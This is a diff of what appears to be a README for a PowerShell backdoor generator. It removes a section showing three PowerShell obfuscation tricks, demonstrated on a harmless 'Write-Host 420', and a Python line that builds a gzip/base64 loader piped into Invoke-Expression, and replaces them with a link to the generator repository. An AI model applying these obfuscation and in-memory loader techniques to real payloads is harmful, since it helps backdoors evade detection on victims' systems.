@@ -92,26 +92,5 @@ or
 ```
 
 ### Powershell Obfuscation Methods
-<p>Numeric to string conversion obfuscation</p>
-<p>Character code obfuscation</p>
-<p>String slicing and indexing obfuscation</p>
-
-```powershell
-# NUMERIC CONVERSION -> Write-Host 420
-[string]::join('',((87,114,105,116,101,45,72,111,115,116,32,52,50,48)|%{[char]$_}))
-
-# CHARACTER CODE -> Write-Host 420
-[char](87)+[char](114)+[char](105)+[char](116)+[char](101)+[char](45)+[char](72)+[char](111)+[char](115)+[char](116)+[char](32)+[char](52)+[char](50)+[char](48)
-
-# STRING SLICING -> Write-Host 420
-"zttxirGVRskXrsEFIcH0X2cPLmO WnoruBWUks-f2neGJNIo46"[34,12,4,2,42,38,18,30,13,1,27,48,40,19] -join ""
-```
-
-### Match and Replace
-<p>Because each method returns a string, we need to include either & and/or & Invoke-Expression</p>
-
-```python
-full_payload = r"$command = '" + encoded_command + r"';(& (\New-Object\) (\IO.Compression.GZipStream\)([System.IO.MemoryStream][Convert]::FromBase64String('" + compressed_base64 + r"'), [System.IO.Compression.CompressionMode]::Decompress) | % {(& (\New-Object\) (\System.IO.StreamReader\)($_, [System.Text.Encoding]::ASCII))}).(\ReadToEnd\)() | Invoke-Expression"
-
-pattern = r"\\.+?\\"
-```
+<p>I'm not re-writing documentation for this, see link below</p>
+[https://github.com/jaekenji/PowerShell-Backdoor-Generator/](Powershell-Backdoor-Generator)
